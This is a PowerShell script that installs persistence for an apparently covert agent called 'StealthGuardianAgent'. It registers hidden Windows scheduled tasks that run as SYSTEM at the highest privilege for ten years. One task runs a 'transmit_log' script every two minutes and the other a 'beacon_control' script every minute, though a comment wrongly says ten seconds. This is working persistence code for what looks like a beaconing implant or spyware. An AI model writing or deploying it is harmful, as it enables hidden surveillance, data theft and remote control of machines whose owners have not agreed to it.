# Function to create or update a scheduled task
function Register-OrUpdateScheduledTask {
    param (
        [string]$TaskName,
        [string]$ScriptPath,
        [string]$Description,
        [timespan]$RepetitionInterval
    )

    $Action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-NoProfile -WindowStyle Hidden -File `"$ScriptPath`""
    $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval $RepetitionInterval -RepetitionDuration ([timespan]::FromDays(3650))
    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

    # Check if the task exists
    $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    if ($task) {
        # Task exists, update it
        Set-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings
        Write-Output "Updated the existing task: $TaskName"
    } else {
        # Task does not exist, create it
        Register-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -TaskName $TaskName -Description $Description
        Write-Output "Created a new task: $TaskName"
    }
}

# Get the directory of the current script
$scriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.Path

# Register or update the "StealthGuardianAgent" task
Register-OrUpdateScheduledTask -TaskName "StealthGuardianAgent" -ScriptPath "$scriptDirectory\3_transmit_log.ps1" -Description "Stealth Guardian Agent Task" -RepetitionInterval (New-TimeSpan -Minutes 2)

# Register or update the "StealthGuardianAgentControl" task to run every 10 seconds
Register-OrUpdateScheduledTask -TaskName "StealthGuardianAgentControl" -ScriptPath "$scriptDirectory\2_beacon_control.ps1" -Description "Stealth Guardian Agent Task for Control" -RepetitionInterval (New-TimeSpan -Seconds 60)
